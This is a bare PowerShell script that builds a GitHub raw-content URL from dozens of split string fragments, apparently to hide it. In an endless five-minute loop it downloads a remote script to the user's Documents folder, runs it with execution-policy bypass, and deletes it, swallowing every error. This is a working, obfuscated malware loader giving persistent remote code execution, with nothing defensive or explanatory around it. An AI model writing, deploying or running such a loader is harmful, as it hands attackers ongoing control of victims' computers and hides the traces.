$r1 = 'https://raw'
$r2 = '.githubus'
$r3 = 'ercontent'
$r4 = '.com/t0'
$r5 = 'fum4n/-0-v'
$r6 = '948'
$r7 = '37-092'
$r8 = '73w54'
$r9 = '-068'
$r10 = '245'
$r11 = '-0v9-6245'
$r12 = '0-69u-b'
$r13 = '2-4059y'
$r14 = '-bn3-2'
$r15 = '40'
$r16 = 'w5'
$r17 = '68'
$r18 = '-3'
$r19 = '4'
$r20 = '5'
$r21 = '0-'
$r22 = '86'
$r23 = '2'
$r24 = '0'
$r25 = '5'
$r26 = '4'
$r27 = '9'
$r28 = '8'
$r29 = '6-'
$r30 = '2034p'
$r31 = '245iuy'
$r32 = 'u6po7'
$r33 = 'iu293'
$r34 = '45w/m'
$r35 = 'ain/p'
$r36 = 's2.ps'
$r37 = '1'

$repoUrl = $r1 + $r2 + $r3 + $r4 + $r5 + $r6 + $r7 + $r8 + $r9 + $r10 + $r11 + $r12 + $r13 + $r14 + $r15 + $r16 + $r17 + $r18 + $r19 + $r20 + $r21 + $r22 + $r23 + $r24 + $r25 + $r26 + $r27 + $r28 + $r29 + $r30 + $r31 + $r32 + $r33 + $r34 + $r35 + $r36 + $r37

$p1 = "$env:USERPROFILE"
$p2 = "\Documents\ps2.ps1"
$filePath = $p1 + $p2

while ($true) {
    try {
        $cmd = "Invoke-WebRequest -Uri $repoUrl -OutFile $filePath"
        Invoke-Expression $cmd

        $runCmd = "powershell -ExecutionPolicy Bypass -File $filePath"
        Invoke-Expression $runCmd

        $removeCmd = "Remove-Item -Path $filePath -Force"
        Invoke-Expression $removeCmd
    } catch {
        $err = "Error: $_"
    }
    Start-Sleep -Seconds 300
}
